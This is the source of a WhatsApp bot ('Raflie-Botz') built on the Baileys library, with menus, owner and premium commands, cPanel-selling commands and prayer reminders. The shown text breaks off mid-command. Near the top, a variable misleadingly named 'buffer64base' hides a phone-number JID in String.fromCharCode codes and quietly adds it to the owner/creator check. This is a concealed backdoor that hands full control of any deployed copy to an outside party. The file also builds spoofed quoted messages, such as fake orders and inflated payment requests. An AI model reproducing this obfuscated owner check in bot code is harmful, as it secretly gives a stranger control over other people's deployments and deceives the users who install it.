/*
© ʀᴀғʟɪᴇ ᴍᴏᴅᴅᴇʀ 
 ᴄʀᴇᴀᴛᴇᴅ ʙᴀsᴇ - sᴋʏᴢᴏᴘᴇᴅɪᴀ

 ᴋᴀʟᴏ ᴍᴀᴜ ʀɪɴᴀᴍᴇ ᴋᴀsɪʜ ᴄʀᴇᴅɪᴛ ʟᴀʜ
 ᴛʜᴀɴᴋs ᴛᴏ ғᴏʀ sᴋʏᴢᴏᴘᴇᴅɪᴀ [ ʙᴀsᴇ ]
 ᴛʜᴀɴᴋs ᴛᴏ ғᴏʀ ʀᴀғʟɪᴇ ᴍᴏᴅᴢ [ ᴘᴇɴɢᴇᴍʙᴀɴɢ ]
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { fromBuffer } = require('file-type');

const { default: WARaflieection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./src/message')
const contacts = JSON.parse(fs.readFileSync("./lib/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./lib/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./lib/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./lib/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./lib/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, resize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/function');

module.exports = Raflie = async (Raflie, m, chatUpdate, store) => {
	try {
await LoadDataBase(Raflie, m)
const botNumber = await Raflie.decodeJid(Raflie.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';
const isCmd = body.startsWith(prefix) ? true : false
const from = m.key.remoteJid
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const mek = fs.readFileSync("./media/rafliebotz.jpg")
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const pushname = m.pushName || "No Name"
const text = q = args.join(' ')
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const xtime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
const date = moment.tz('Asia/Jakarta').format('DD MMMM YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss');
if(time2 < "23:59:00"){
var Raflietime = `Selamat Malam 🌌`
}
if(time2 < "19:00:00"){
var Raflietime = `Selamat Malam 🌠`
}
if(time2 < "18:00:00"){
var Raflietime = `Selamat Malam 🌠`
}
if(time2 < "15:00:00"){
var Raflietime = `Selamat Sore 🌇`
}
if(time2 < "11:00:00"){
var Raflietime = `Selamat Siang 🌅`
} 
if(time2 < "05:00:00"){
var Raflietime = `Selamat Pagi 🌄` }  


if (command) {
console.log(`
${chalk.inverse(' 📬 COMMAND RECEIVED ')}  ${chalk.inverse(` ${new Date().toLocaleString()} `)}

${chalk.magenta.bold('╭─ > From:')}      ${chalk.green.bold(pushname || 'Unknown')} ${chalk.yellow(`(${m.sender})`)}
${chalk.magenta.bold('├─ > In:')}        ${chalk.cyan.bold(m.isGroup ? 'Group Chat' : 'Private Chat')} ${chalk.gray(from)}
${chalk.magenta.bold('╰─ > Message:')}   ${chalk.white.bold(budy || m.mtype)}

${chalk.greenBright.bold('╭────────────────────────────────────────────╮')}
${chalk.greenBright.bold('│     Raflie-Botz-Cpanel⚡.                    │')}
${chalk.greenBright.bold('╰────────────────────────────────────────────╯')} `)}


//user
let cekUser = (satu, dua) => { 
    let x1 = false;
    Object.keys(db_user).forEach((i) => {
        if (db_user[i].id == dua) { x1 = i }
    });

    if (x1 !== false) {
        if (satu == "id") return db_user[x1].id;
        if (satu == "name") return db_user[x1].name;
        if (satu == "seri") return db_user[x1].seri;
        if (satu == "umur") return db_user[x1].umur;
        if (satu == "premium") return db_user[x1].premium;
    }
    return null;
}

//func makeid
const makeid = () => {
    let result = '';
    const characters = '0123456789';
    for (let i = 0; i < 2; i++) {
        result += characters.charAt(Math.floor(Math.random() * 10));
    }
    return result;
};

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return Yl.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await reply(check.respon)
}}

const xmodz = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: "https://files.catbox.moe/un7qm8.jpg",
      itemCount: "999999",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const Rafliereply = (bokep) => { 
    Raflie.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
            'mentionedJid': [m.sender], 
            'forwardingScore': 0x98967f,
            'isForwarded': true,
            'externalAdReply': {
                'showAdAttribution': true,
                'containsAutoReply': true,
                'title': "𝗥𝗮𝗳𝗹𝗶𝗲-𝗕𝗼𝘁𝘇",
                'body': `𝗦𝗰𝗿𝗶𝗽𝘁 𝗯𝘆 𝗥𝗮𝗳𝗹𝗶𝗲𝗗𝗲𝘃`,
                'previewType': "PHOTO",
                'thumbnailUrl': 'https://files.catbox.moe/x5tflg.jpg',
                'sourceUrl': 'xnxx.Raflie.com'
            }
        }
    }, {
        'quoted': xmodz // Mengutip pesan sebelumnya
    });
};


//PRINGATAN AUTO SHALAT
Raflie.autosholat = Raflie.autosholat ? Raflie.autosholat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? Raflie.user.jid : m.sender
let id = m.chat
if (!(id in Raflie.autosholat)) {
let jadwalSholat = {
Fajr: "04:36",
Dhuhr: "12:09",
Asr: "15:15",
Maghrib: "18:12",
Isha: "19:23",
}
const date = new Date((new Date).toLocaleString("en-US", {
timeZone: "Asia/Jakarta"
}));
const hours = date.getHours();
const minutes = date.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu) {
if (sholat === "Fajr") {
thumbislam = "https://telegra.ph/file/b666be3c20c68d9bd0139.jpg"
} else if (sholat === "Dhuhr") {
thumbislam = "https://telegra.ph/file/5295095dad53783b9cd64.jpg"
} else if (sholat === "Asr") {
thumbislam = "https://telegra.ph/file/c0e1948ad75a2cba22845.jpg"
} else if (sholat === "Maghrib") {
thumbislam = "https://telegra.ph/file/0082ad9c0e924323e08a6.jpg"
} else if (sholat === "Isha") {
thumbislam = "https://telegra.ph/file/fd141833a983afa0a8412.jpg"
} else {
thumbislam = "https://telegra.ph/file/687fd664f674e90ae1079.jpg"
}
Raflie.autosholat[id] = [
Raflie.sendMessage(m.chat, {
audio: {
url: "https://www.vreden.web.id/database/islamic/y2mate.com%20-%20Adzan%20Merdu%20Irama%20Jiharkah%20%20menyejukkan%20hati%20.mp3"
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `Waktu ${sholat} Telah Tiba, Ambilah Air Wudhu Dan Segeralah Shalat🙂`,
body: "Untuk Wilayah Jakarta Dan Sekitarnya",
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: "https://files.catbox.moe/x5tflg.jpg",
sourceUrl: "-"
}
}
}, {
quoted: m
}),
setTimeout(() => {
delete Raflie.autosholat[id]
}, 57000)]}}}


//TOTALFITUR ALL
const totalFitur = () =>{
var mytext = fs.readFileSync("RaflieBotz.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
}

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

const RaflieDevStickSc = () => {
        let RaflieDevStikRep = fs.readFileSync('./sticker-reply/sc.webp')
        Raflie.sendMessage(from, { sticker: RaflieDevStikRep }, { quoted: m })
        }  

// Function
async function loadingBot() {
var loadingMessages = [
"🔄 Starting bot...",
"⚙️ ɪɴɪsɪᴀʟɪsᴀsɪ sɪsᴛᴇᴍ..\n> ▰▱▱▱▱▱▱",
"⚙️ ᴍᴇᴍᴜᴀᴛ ᴋᴏɴғɪɢᴜʀᴀsɪ...\n> ▰▰▱▱▱▱▱",
"⚙️ ᴍᴇɴɢᴇᴄᴇᴋ ᴋᴏɴᴇᴋsɪ...\n> ▰▰▰▱▱▱▱",
"⚙️ ᴍᴇɴʏɪᴀᴘᴋᴀɴ ғɪᴛᴜʀ...\n> ▰▰▰▰▱▱▱",
"⚙️ ᴀᴋᴛɪғᴀsɪ ʟᴀʏᴀɴᴀɴ...\n> ▰▰▰▰▰▱▱",
"⚙️ ʜᴀᴍᴘɪʀ sᴇʟᴇsᴀɪ...\n> ▰▰▰▰▰▰▱",
"☑️ Loading Success!" ];
let { key } = await Raflie.sendMessage(from, { text: "🔄 sᴛᴀʀᴛɪɴɢ ʙᴏᴛ.." });
for (let i = 1; i < loadingMessages.length; i++) {
await new Promise(resolve => setTimeout(resolve, 430)); 
await Raflie.sendMessage(from, { text: loadingMessages[i], edit: key })}}

// Command Is here

switch (command) {
case "menu": {
await Raflie.sendMessage(m.chat, {react: {text: '💤', key: m.key}})	
let anjay = ` 
╭━━━━━━━━━━━━━━━━━━━╮     
┃⚙️ 𝗠𝘆 𝗡𝗮𝗺𝗲 𝗜𝘀 𝗥𝗮𝗳𝗹𝗶𝗲-𝗕𝗼𝘁𝘇 
╰━━━─────────────━━━╯  

╭━━━〔 ☀ 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 👋 〕━━━╮  
┃🎃 ʜᴇʟʟᴏ, *${pushname}👋*  
┃🎃 ɪ ᴀᴍ *sᴄʀɪᴘᴛ ʀᴀғʟɪᴇ ʙᴏᴛᴢ* 
┃🎃 ᴀssɪsᴛᴀɴᴛ ʙᴏᴛ ᴛʜᴀᴛ ʜᴇʟᴘs   
┃🎃 ʏᴏᴜ ʀᴇᴍᴏᴠᴇ ᴘᴇsᴛs.   
╰━━━────────────━━━━━━╯  

╭──( 🤖 ɪɴғᴏ ʙᴏᴛ 🤖 )──╮  
│🤖 ɴᴀᴍᴇ ʙᴏᴛ : ʀᴀғʟɪᴇ-ʙᴏᴛᴢ 
│🤖 ᴄʀᴇᴀᴛᴏʀ : ${global.owner}
│🤖 ᴠᴇʀsɪ ʙᴏᴛ : 𝟷.𝟶.𝟶 
│🤖 ᴍᴏᴅᴇ ʙᴏᴛ : *${Raflie.public ? "ᴘᴜʙʟɪᴄ": "sᴇʟғ"}*
│🤖 ʀᴜɴᴛɪᴍᴇ ʙᴏᴛ : ${runtime(process.uptime())}
│🤖 ᴡᴀᴋᴛᴜ : ${xtime}
│🤖 ᴛᴏᴛᴀʟ ғɪᴛᴜʀᴇ :${totalFitur()}
╰────────────────────╯

╭━━━━━━━━━━━━━━━━━━━╮     
┃🎮 𝗦𝗲𝗹𝗹𝗲𝗰𝘁 𝗧𝗼 𝗕𝘂𝘁𝘁𝗼𝗻 𝗕𝗲𝗹𝗼𝘄 
╰━━━─────────────━━━╯  
`;
let buttons = [
        { buttonId: ".script", buttonText: { displayText: "々sᴄʀɪᴘᴛ" } },
        { buttonId: ".owner", buttonText: { displayText: "々ᴅᴇᴠᴇʟᴏᴘᴇʀ" } },
        { buttonId: ".allmenu", buttonText: { displayText: "々ᴀʟʟᴍᴇɴᴜ" } }
    ];

    let buttonMessage = {
        image: { 
            url: "https://files.catbox.moe/x5tflg.jpg", 
            gifPlayback: true 
        },
        caption: anjay,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363417629619532@newsletter",
                newsletterName: `𝗥𝗮𝗳𝗹𝗶𝗲-𝗕𝗼𝘁𝘇`
            }
        },
        footer: "ʀᴀғʟɪᴇ ᴍᴏᴅᴢ!",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "💞 ʟɪsᴛ ᴍᴇɴᴜ 💞",
                    sections: [
                        {
                            title: "⚡ sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʟɪsᴛ ⚡",
                            highlight_label: "ʀᴀғʟɪᴇ ᴅᴇᴠ",
                            rows: [
                                { title: "𒈒ᴀʟʟ ᴍᴇɴᴜ", description: "𝚅𝙸𝙴𝚆 𝙰𝙻𝙻 𝙵𝙸𝚃𝚄𝚁𝙴", id: ".allmenu" },
                                { title: "𒈒ᴏᴡɴᴇʀ", description: "𝚅𝙸𝙴𝚆 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 𝙾𝚆𝙽𝙴𝚁", id: ".owner" },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await Raflie.sendMessage(m.chat, buttonMessage, { quoted: xmodz });
};
break;

case 'allmenu': {
await loadingBot()
let allmenu = `
╭──( 🤖 ɪɴғᴏ ʙᴏᴛ 🤖 )──╮  
│🤖 ɴᴀᴍᴇ ʙᴏᴛ : ʀᴀғʟɪᴇ-ʙᴏᴛᴢ 
│🤖 ᴄʀᴇᴀᴛᴏʀ : ${global.owner}
│🤖 ᴠᴇʀsɪ ʙᴏᴛ : 𝟷.𝟶.𝟶 
│🤖 ᴍᴏᴅᴇ ʙᴏᴛ : *${Raflie.public ? "ᴘᴜʙʟɪᴄ": "sᴇʟғ"}*
│🤖 ʀᴜɴᴛɪᴍᴇ ʙᴏᴛ : ${runtime(process.uptime())}
│🤖 ᴡᴀᴋᴛᴜ : ${xtime}
│🤖 ᴛᴏᴛᴀʟ ғɪᴛᴜʀᴇ :${totalFitur()}
╰────────────────────╯
╭━━━━━━━━━━━━━━━━━━━╮     
┃⚙️ 𝗠𝘆 𝗡𝗮𝗺𝗲 𝗜𝘀 𝗥𝗮𝗳𝗹𝗶𝗲-𝗕𝗼𝘁𝘇 
╰━━━─────────────━━━╯  

╭──[𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄👑]──╮  
│🤖 .𝙰𝙳𝙳𝙾𝚆𝙽𝙴𝚁
│🤖 .𝙳𝙴𝙻𝙾𝚆𝙽𝙴𝚁
│🤖 .𝙰𝙳𝙳𝚁𝙴𝚂𝚂
│🤖 .𝙳𝙴𝙻𝚁𝙴𝚂𝚂
│🤖 .𝙻𝙸𝚂𝚃𝙾𝚆𝙽𝙴𝚁
│🤖 .𝙻𝙸𝚂𝚃𝚁𝙴𝚂𝚂
│🤖 .𝚂𝙴𝙻𝙵
│🤖 .𝙿𝚄𝙱𝙻𝙸𝙲
│🤖 .𝙳𝙾𝙽𝙴
│🤖 .𝙺𝙴𝚈
╰────────────────╯

╭──[𝙲𝙿𝙰𝙽𝙴𝙻 𝚂𝙴𝚁𝚅𝙴𝚁-1📡]──╮  
│🤖 .𝟷𝙶𝙱
│🤖 .𝟸𝙶𝙱
│🤖 .𝟹𝙶𝙱
│🤖 .𝟺𝙶𝙱
│🤖 .𝟻𝙶𝙱
│🤖 .𝟼𝙶𝙱
│🤖 .𝟽𝙶𝙱
│🤖 .𝟾𝙶𝙱
│🤖 .𝟿𝙶𝙱
│🤖 .𝟷𝟶𝙶𝙱
│🤖 .𝟷𝟷𝙶𝙱
│🤖 .𝟷𝟸𝙶𝙱
│🤖 .𝟷𝟹𝙶𝙱
│🤖 .𝟷𝟺𝙶𝙱
│🤖 .𝟷𝟻𝙶𝙱
│🤖 .𝟷𝟼𝙶𝙱
│🤖 .𝟷𝟽𝙶𝙱
│🤖 .𝟷𝟾𝙶𝙱
│🤖 .𝟷𝟿𝙶𝙱
│🤖 .𝟸𝟶𝙶𝙱
│🤖 .𝟸𝟷𝙶𝙱
│🤖 .𝟸𝟸𝙶𝙱
│🤖 .𝟸𝟹𝙶𝙱
│🤖 .𝟸𝟺𝙶𝙱
│🤖 .𝟸𝟻𝙶𝙱
│🤖 .𝚄𝙽𝙻𝙸
│🤖 .𝙲𝙰𝙳𝙿
│🤖 .𝙻𝙸𝚂𝚃𝙿𝙰𝙽𝙴𝙻
│🤖 .𝙻𝙸𝚂𝚃𝙰𝙳𝙼𝙸𝙽
│🤖 .𝙳𝙴𝙻𝙿𝙰𝙽𝙴𝙻
│🤖 .𝙳𝙴𝙻𝙰𝙳𝙼𝙸𝙽
╰────────────────╯

╭──[𝙲𝙿𝙰𝙽𝙴𝙻 𝚂𝙴𝚁𝚅𝙴𝚁-𝟸📡]──╮  
│🤖 .𝟷𝙶𝙱𝚅𝟸
│🤖 .𝟸𝙶𝙱𝚅𝟸
│🤖 .𝟹𝙶𝙱𝚅𝟸
│🤖 .𝟺𝙶𝙱𝚅𝟸
│🤖 .𝟻𝙶𝙱𝚅𝟸
│🤖 .𝟼𝙶𝙱𝚅𝟸
│🤖 .𝟽𝙶𝙱𝚅𝟸
│🤖 .𝟾𝙶𝙱𝚅𝟸
│🤖 .𝟿𝙶𝙱𝚅𝟸
│🤖 .𝟷𝟶𝙶𝙱𝚅𝟸
│🤖 .𝚄𝙽𝙻𝙸𝚅𝟸
│🤖 .𝙲𝙰𝙳𝙿𝚅𝟸
│🤖 .𝙻𝙸𝚂𝚃𝙿𝙰𝙽𝙴𝙻𝚅𝟸
│🤖 .𝙻𝙸𝚂𝚃𝙰𝙳𝙼𝙸𝙽𝚅𝟸
│🤖 .𝙳𝙴𝙻𝙿𝙰𝙽𝙴𝙻𝚅𝟸
│🤖 .𝙳𝙴𝙻𝙰𝙳𝙼𝙸𝙽𝚅𝟸
╰────────────────╯

╭──[𝙲𝙿𝙰𝙽𝙴𝙻 𝚂𝙴𝚁𝚅𝙴𝚁-𝟹📡]──╮  
│🤖 .𝟷𝙶𝙱𝚅𝟹
│🤖 .𝟸𝙶𝙱𝚅𝟹
│🤖 .𝟹𝙶𝙱𝚅𝟹
│🤖 .𝟺𝙶𝙱𝚅𝟹
│🤖 .𝟻𝙶𝙱𝚅𝟹
│🤖 .𝟼𝙶𝙱𝚅𝟹
│🤖 .𝟽𝙶𝙱𝚅𝟹
│🤖 .𝟾𝙶𝙱𝚅𝟹
│🤖 .𝟿𝙶𝙱𝚅𝟹
│🤖 .𝟷𝟶𝙶𝙱𝚅𝟹
│🤖 .𝚄𝙽𝙻𝙸𝚅𝟹
│🤖 .𝙲𝙰𝙳𝙿𝚅𝟹
│🤖 .𝙻𝙸𝚂𝚃𝙿𝙰𝙽𝙴𝙻𝚅𝟹
│🤖 .𝙻𝙸𝚂𝚃𝙰𝙳𝙼𝙸𝙽𝚅𝟹
│🤖 .𝙳𝙴𝙻𝙿𝙰𝙽𝙴𝙻𝚅𝟹
│🤖 .𝙳𝙴𝙻𝙰𝙳𝙼𝙸𝙽𝚅𝟹
╰────────────────╯
`
let buttons = [
        { buttonId: ".owner", buttonText: { displayText: "変 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/d0a52u.jpg` },
	    gifPlayback: true,
        caption: allmenu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363417629619532@newsletter",
                newsletterName: `𝗥𝗮𝗳𝗹𝗶𝗲-𝗕𝗼𝘁𝘇`
            }
        },
        footer: "𝕽𝖆𝖋𝖑𝖎𝖊 𝕭𝖔𝖙𝖟",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "💞 𝐋𝐢𝐬𝐭𝐒𝐞𝐥𝐥𝐞𝐜𝐭 💞",
                    sections: [
                        {
                            title: "Please Chose One",
                            highlight_label: "",
                            rows: [
                                { title: "sᴄʀɪᴘᴛ", description: "Menampilkan Script", id: ".script" },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await Raflie.sendMessage(m.chat, buttonMessage, { quoted: xmodz });
};
break

case 'owner': case 'developer': case 'dev': {
try {
let ppuser;
try {
ppuser = await Raflie.profilePictureUrl(global.owner + '@s.whatsapp.net', 'image');
} catch (err) {
ppuser = 'https://files.catbox.moe/t0cyvy.jpg'; }
const kontak = {
"displayName": '尺卂千ㄥ丨乇 ⚡︎ ᗪ乇ᐯ︎',
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${global.ownername}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X-ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${global.namaOwner}@gmail.com\nORG: INI OWNER\nEND:VCARD` };
await Raflie.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo: {
forwardingScore: 999,
isForwarded: false,
mentionedJid: [sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": "нᴀι ԍᴀɴтᴇɴԍ 🐣",  
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": await getBuffer(ppuser), 
"mediaUrl": ppuser, 
"sourceUrl": "https://whatsapp.com/channel/0029Vb5YjAcGE56qcqWJyy3t" }}
}, { quoted: xmodz });
} catch (err) {
console.log(err);
m.reply("Terjadi kesalahan saat mengirim kontak owner.")}
break; }

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Rafliereply(`Format salah!\nContoh: done NamaProduk,5000`)  
let [namaProduk, hargaText] = text.split(",")
if (!namaProduk || !hargaText) return Rafliereply(`Format salah!\nContoh: done Script Premium,5000`)
if (isNaN(hargaText)) return Rafliereply(`Harga harus angka!`)
let harga = parseInt(hargaText)
let buy = `Produk 📦 : ${namaProduk}
Tanggal 🗓 : ${tanggal(Date.now())}
Time ⏱️ : ${xtime}

*No Owner :*
${global.owner}

*Kata Kunci :*
${global.key}`
Raflie.relayMessage(m.chat, {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: harga * 1000, // harga otomatis diubah ke format payment
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: buy,
contextInfo: {
externalAdReply: {
showAdAttribution: true }}}}}}, {})
await sleep(2500)}
break

case "script": case "sc": {
let buy = `
sᴄʀɪᴘᴛ ɪɴɪ ᴅɪ ʙᴀɢɪᴋᴀɴ ᴏʟᴇʜ ʀᴀғʟɪᴇ ᴊɪᴋᴀ ɪɴɢɪɴ sᴄʀɪᴘᴛ ɪɴɪ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴏᴡɴᴇʀ.
`
Raflie.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 1000000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
 RaflieDevStickSc()
await sleep(2500)
}
break

case "self":{
if (!isCreator) return await Raflie.sendMessage(m.chat, {react: {text: '❌', key: m.key}})	
Raflie.public = false
await Raflie.sendMessage(m.chat, {react: {text: '☑️', key: m.key}})	
}
break

case "public":{
if (!isCreator) return await Raflie.sendMessage(m.chat, {react: {text: '❌', key: m.key}})	
Raflie.public = true
await Raflie.sendMessage(m.chat, {react: {text: '☑️', key: m.key}})	
}
break

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Rafliereply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return Rafliereply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return Rafliereply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owners, null, 2))
Rafliereply(`Berhasil menghapus owner ✅`)
}
break

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Rafliereply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return Rafliereply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owners, null, 2))
